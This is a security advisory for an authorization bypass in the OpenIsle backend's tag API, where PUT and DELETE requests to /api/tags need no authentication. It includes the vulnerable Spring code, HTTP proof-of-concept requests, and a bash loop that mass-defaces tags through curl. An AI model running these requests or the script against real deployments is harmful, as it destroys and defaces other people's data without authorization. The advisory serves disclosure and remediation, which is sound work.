# OpenIsle Tags Unauthorized Modification/Deletion

**Vendor:** OpenIsle Community
**Product:** OpenIsle Backend
**Type:** Web Application - Community Platform (Java Spring Boot)
**Component:** Tag Management API
**Affected Version(s):** v0.0.1-SNAPSHOT and prior versions
**Fixed Version:** [To be determined]
**Repository:** https://github.com/nagisa77/openisle

## Vulnerability Classification

### Primary Classification
**Vulnerability Class:** Authorization Bypass
**CWE ID:** CWE-862 - Missing Authorization
**CAPEC ID:** CAPEC-87 - Forceful Browsing

### MITRE ATT&CK Mapping
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Sub-Technique:** N/A

### CVSS v3.1 Metrics

**Base Score:** 9.1 - CRITICAL
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

#### Detailed Metrics
| Metric | Value | Score |
|--------|-------|-------|
| **Attack Vector (AV)** | Network (N) | Worst |
| **Attack Complexity (AC)** | Low (L) | Worst |
| **Privileges Required (PR)** | None (N) | Worst |
| **User Interaction (UI)** | None (N) | Worst |
| **Scope (S)** | Unchanged (U) | - |
| **Confidentiality (C)** | None (N) | - |
| **Integrity (I)** | High (H) | High |
| **Availability (A)** | High (H) | High |


### Summary
A critical authorization bypass vulnerability in OpenIsle backend allows unauthenticated remote attackers to modify and delete arbitrary tag resources without authentication. The vulnerability exists in HTTP PUT and DELETE endpoints for tag management due to incomplete Spring Security configuration and missing controller-level access controls.

### Technical Description

The vulnerability is caused by two fundamental security configuration gaps:

**Root Cause 1 - Incomplete HTTP Method Protection:**
The Spring Security configuration in `SecurityConfig.java` defines authorization rules only for POST and DELETE methods, completely omitting PUT method:

```java
// SecurityConfig.java (Vulnerable Configuration)
.requestMatchers(HttpMethod.POST, "/api/tags/**").hasAuthority("ADMIN")
.requestMatchers(HttpMethod.DELETE, "/api/tags/**").hasAuthority("ADMIN")
// CRITICAL FLAW: No PUT method configuration exists
```

**Root Cause 2 - Missing Controller Annotations:**
The `TagController.java` lacks defense-in-depth security annotations:

```java
// TagController.java:75-85 (Vulnerable Code)
@PutMapping("/{id}")
// Missing: @SecurityRequirement(name = "JWT")
// Missing: @PreAuthorize("hasAuthority('ADMIN')")
public TagDto update(@PathVariable Long id, @RequestBody TagRequest req) {
    Tag tag = tagService.updateTag(id, req.getName(), ...);
    return tagMapper.toDto(tag, count);
}

// TagController.java:90-92 (Vulnerable Code)
@DeleteMapping("/{id}")
// Missing: @SecurityRequirement(name = "JWT")
// Missing: @PreAuthorize("hasAuthority('ADMIN')")
public void delete(@PathVariable Long id) {
    tagService.deleteTag(id);
}
```

### Affected Endpoints
- `PUT /api/tags/{id}` - Unauthorized tag modification
- `DELETE /api/tags/{id}` - Unauthorized tag deletion


Affected Components

### Source Code Files

| File | Component | Lines | Vulnerable Code |
|------|-----------|-------|-----------------|
| `TagController.java` | Controller | 75-85 | `update()` method - Missing auth |
| `TagController.java` | Controller | 90-92 | `delete()` method - Missing auth |
| `TagService.java` | Service | 68-88 | `updateTag()` - No auth check |
| `TagService.java` | Service | 91-94 | `deleteTag()` - No auth check |
| `SecurityConfig.java` | Security | N/A | Missing PUT method config |

### API Endpoints (Vulnerable)
- **PUT** `https://[host]/api/tags/{id}` - Tag modification
- **DELETE** `https://[host]/api/tags/{id}` - Tag deletion


Proof of Concept #1 - Tag Modification

```http
PUT /api/tags/1 HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: 85

{
  "name": "Defaced Tag",
  "description": "Modified without authentication - PoC"
}
```

**Response (Vulnerable System):**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "name": "Defaced Tag",
  "description": "Modified without authentication - PoC",
  "postCount": 42
}
```

### Proof of Concept #2 - Tag Deletion

```http
DELETE /api/tags/1 HTTP/1.1
Host: target.example.com
```

**Response (Vulnerable System):**
```http
HTTP/1.1 200 OK
```

### Proof of Concept #3 - Automated Mass Exploitation

```bash
#!/bin/bash
# Mass tag modification attack
TARGET="https://target.example.com"

for id in {1..100}; do
  curl -s -X PUT "$TARGET/api/tags/$id" \
    -H "Content-Type: application/json" \
    -d '{"name":"Compromised-'$id'","description":"Defaced"}' \
    && echo "Tag $id modified"
done
```

